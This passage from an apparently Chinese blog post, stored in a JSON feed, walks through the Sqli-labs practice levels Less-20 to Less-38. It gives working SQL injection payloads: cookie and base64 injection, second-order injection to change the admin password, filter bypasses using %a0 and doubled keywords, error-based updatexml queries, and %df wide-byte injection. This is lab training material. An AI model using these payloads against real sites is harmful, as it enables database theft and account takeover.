title=\"Less-20\"></a>Less-20</h2>打开提示cookie，那就先抓个包，构造cookie<code>uname=admin&#39;</code>发现报错，可知存在注入点，其余就是正常步骤，先判断列数，可以发现是3。。。。<h2 id=\"Less-21\"><a href=\"#Less-21\" class=\"headerlink\" title=\"Less-21\"></a>Less-21</h2>用<code>&#39;)</code>闭合，并且是要经过base64编码，其余同上<h2 id=\"Less-22\"><a href=\"#Less-22\" class=\"headerlink\" title=\"Less-22\"></a>Less-22</h2>用<code>&quot;</code>闭合<h2 id=\"Less-23\"><a href=\"#Less-23\" class=\"headerlink\" title=\"Less-23\"></a>Less-23</h2><code>#</code>以及<code>--</code>被过滤<br>那就用<code>or &#39;1&#39;=&#39;1</code>来闭合多余出来的单引号<h2 id=\"Less-24\"><a href=\"#Less-24\" class=\"headerlink\" title=\"Less-24\"></a>Less-24</h2>二次注入<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/10.png\" alt=\"sql\"><br>先注册一个用户名为<code>admin&#39; #</code>的账号，虽然注册时会被转义，但是数据还是会被存入数据库，所以在接下来其他地方被调用时就会出现漏洞，即在改密码时，SQL语句拼接出<code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; #&#39; and password=&#39;$curr_pass&#39; &quot;</code>，就可以修改admin的密码，实现SQL注入<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/11.png\" alt=\"sql\"><br>就可以用admin账户登录<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/12.png\" alt=\"sql\"></li>\n</ol>\n<h2 id=\"Less-25\"><a href=\"#Less-25\" class=\"headerlink\" title=\"Less-25\"></a>Less-25</h2><p>AND和OR都被过滤，但是UNION没有被过滤可以实现注入，并且可以通过双写来Bypass过滤：<code>id=-1&#39; oorr 1=1--+</code></p>\n<h2 id=\"Less-25a\"><a href=\"#Less-25a\" class=\"headerlink\" title=\"Less-25a\"></a>Less-25a</h2><p>和25一样</p>\n<h2 id=\"Less-26\"><a href=\"#Less-26\" class=\"headerlink\" title=\"Less-26\"></a>Less-26</h2><p>过滤了空格，本想着用<code>/**/</code>绕过，发现还是不行，一看源码：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/13.png\" alt=\"sql\"><br>过滤了大部分的东西，本来想着绕过空格的方式：<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格，发现其中%a0以及%0b可用，<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/14.png\" alt=\"sql\"><br>或者需要用()绕过，使用报错注入的方式，构造payload：<code>?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/15.png\" alt=\"sql\"><br><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code>爆表名<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/16.png\" alt=\"sql\"></p>\n<h2 id=\"Less-26a\"><a href=\"#Less-26a\" class=\"headerlink\" title=\"Less-26a\"></a>Less-26a</h2><p>基于绕过过滤空格后的正确注入（可用%a0绕过），或者基于bool盲注，因为没有错误回显，所以不能报错注入</p>\n<h2 id=\"Less-27\"><a href=\"#Less-27\" class=\"headerlink\" title=\"Less-27\"></a>Less-27</h2><p>题目说过滤了UNION和SELECT，但是查看源代码发现可以大小写绕过。。。同时过滤了空格和注释夫，可以用上面的方法绕过，payload“<code>?id=0&#39;%a0unIon%a0seleCt%a01,2,3||&#39;1&#39;=&#39;1</code></p>\n<h2 id=\"Less-27a\"><a href=\"#Less-27a\" class=\"headerlink\" title=\"Less-27a\"></a>Less-27a</h2><p>用<code>&quot;</code>闭合，其余同上</p>\n<h2 id=\"Less-28\"><a href=\"#Less-28\" class=\"headerlink\" title=\"Less-28\"></a>Less-28</h2><p>虽然题目说过滤了union和select，但是发现仍然是可以用的，不知道是环境问题还是题目本来就是这样的，同时是用<code>(&#39;</code>闭合的，且过滤了空格等，课用上面的方法绕过<br>payload：<code>?id=0&#39;)%a0union%a0select%a01,2,3||(&#39;1&#39;=&#39;1</code><br>后来才发现题目是过滤了<code>union select</code>这个词组，因为中间加了<code>%a0</code>,刚好绕过了检测</p>\n<h2 id=\"Less-28a\"><a href=\"#Less-28a\" class=\"headerlink\" title=\"Less-28a\"></a>Less-28a</h2><p>同上，但是貌似减少课过滤的东西，更简单了？？</p>\n<h2 id=\"Less-29\"><a href=\"#Less-29\" class=\"headerlink\" title=\"Less-29\"></a>Less-29</h2><p>尝试一下<code>?id=0%27union%20select%201,2,3--+</code>,发现好像啥也没过滤？？？<br>然后就和第一关一样了。。。</p>\n<h2 id=\"Less-30\"><a href=\"#Less-30\" class=\"headerlink\" title=\"Less-30\"></a>Less-30</h2><p>先用单引号闭合发现没用，再用双引号闭合发现报错，接下来就和上面的一样了</p>\n<h2 id=\"Less-31\"><a href=\"#Less-31\" class=\"headerlink\" title=\"Less-31\"></a>Less-31</h2><p>用<code>&quot;)</code>闭合，其余一样</p>\n<h2 id=\"Less-32\"><a href=\"#Less-32\" class=\"headerlink\" title=\"Less-32\"></a>Less-32</h2><p>宽字节注入，payload：<code>?id=0%df%27%20union%20select%201,2,3--+</code></p>\n<h2 id=\"Less-33\"><a href=\"#Less-33\" class=\"headerlink\" title=\"Less-33\"></a>Less-33</h2><p>同上</p>\n<h2 id=\"Less-34\"><a href=\"#Less-34\" class=\"headerlink\" title=\"Less-34\"></a>Less-34</h2><p>这里的提交方式是post，但是又用/转义了’，一种方式是将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ ，但是这%df仍然可以用<br>，再加上报错注入：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/17.png\" alt=\"sql\"></p>\n<h2 id=\"Less-35\"><a href=\"#Less-35\" class=\"headerlink\" title=\"Less-35\"></a>Less-35</h2><p>直接注。。。</p>\n<h2 id=\"Less-36\"><a href=\"#Less-36\" class=\"headerlink\" title=\"Less-36\"></a>Less-36</h2><p>%df宽字节注入</p>\n<h2 id=\"Less-37\"><a href=\"#Less-37\" class=\"headerlink\" title=\"Less-37\"></a>Less-37</h2><p>这一次就没有像34关一样简单，%df没有办法用了，但是可以将utf-8转换为utf-16或 utf-32，构造payload“<code>111�&#39; union select 1,(select database())--+</code></p>\n<p><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/18.png\" alt=\"sql\"></p>\n<h2 id=\"Less-38\"><a href=\"#Less-38\" class=\"headerlink\" title=\"Less-38\"></a>Less-38</h2><p>直接注。。。</p>\n",
            "tags": []
        }
    ]
}